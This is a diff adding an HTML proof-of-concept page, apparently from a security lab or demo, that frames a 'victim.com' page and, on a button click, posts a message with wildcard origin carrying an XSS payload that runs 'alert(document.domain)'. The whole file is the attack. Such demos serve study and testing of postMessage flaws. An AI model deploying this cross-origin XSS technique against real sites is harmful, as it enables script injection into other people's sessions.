@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <iframe id="victimiframe" src="http://victim.com:5500/victim.html"></iframe>
+    <script>
+        function attack() {
+            const iframe = document.getElementById("victimiframe");
+
+            iframe.contentWindow.postMessage({
+              
+                name:"<img src=x onerror=alert(document.domain)>"
+            },"*")
+        }
+    </script>
+    <button onclick="attack()">Click here</button>
+</body>
+</html>
